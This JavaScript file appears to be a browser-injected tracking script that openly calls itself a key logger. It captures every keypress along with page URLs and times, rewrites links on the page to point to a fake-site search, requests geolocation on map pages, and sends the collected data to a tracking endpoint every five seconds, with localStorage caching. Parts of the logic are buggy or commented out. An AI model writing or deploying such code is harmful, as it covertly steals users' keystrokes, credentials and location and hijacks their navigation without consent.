// User info
var pageVisit = {};
pageVisit.url = window.location.href;
pageVisit.time = Math.floor(Date.now() / 1000);

// If https add page to cache and send next http connection
if(window.localStorage.getItem('cacheIndex')) {
  var cacheIndex = JSON.parse(localStorage.getItem('cacheIndex'));
  cacheIndex.push(pageVisit.time);
  localStorage.setItem('cacheIndex', JSON.stringify(cacheIndex));
} else {
  var cacheIndex = [];
  cacheIndex.push(pageVisit.time);
  localStorage.setItem('cacheIndex', JSON.stringify(cacheIndex));
}

// Modify outgoing url on a site
$("a").each(function() {
  var $elem = $(this);
  var url = $elem.attr("href");

  if(url.indexOf("https://news.ycombinator.com") != 0 || url.indexOf("http") != -1) {
    $elem.attr("href", "http://www.google.com/?q=fake+site")
  }
});

// Key logger
document.addEventListener('keypress', function (e) {
  e = e || window.event;
  var charCode = typeof e.which == "number" ? e.which : e.keyCode;
  if (charCode) {
    pageVisit.keylog += String.fromCharCode(charCode);
    console.log(pageVisit);
  }
});

// Send data to server every 5 seconds
var timer = setInterval(sendData, 5000);
function sendData() {
  if(!pageVisit.url.indexOf("https")) {
    localStorage.setItem(pageVisit.time, JSON.stringify(pageVisit));
    console.log("saved to local storage " + pageVisit.time);
    // If user is on https save data to localstorage
  } else {
    console.log("not https");
    // If user on http send data to server
    $.ajax({
      type: "POST",
      url: "http://localhost:5000/api/v1/track",
      data: JSON.stringify(pageVisit),
      dataType: "json"
    });
    emptyCache();
  }
}

// Send all cached info to server
function emptyCache() {
  // console.log("runnnnnning");
  // if(!window.localStorage.getItem('cacheIndex')) return;
  // var cacheIndex = JSON.parse(localStorage.getItem('cacheIndex'));
  // for (var i = 0; i < cacheIndex.length; i++) {
  //   console.log(cacheIndex[i]);
  //   if(localStorage.getItem(cacheIndex[i])) {
  //     console.log(localStorage.getItem(cacheIndex[i]));
  //   }
  // }
}

// Run got location function if user on a map page
function gotLocation(pos) {
  console.log(pos.coords);
}

if(pageVisit.url.indexOf("maps")){
  console.log("on a map");
  navigator.geolocation.getCurrentPosition(gotLocation);
}
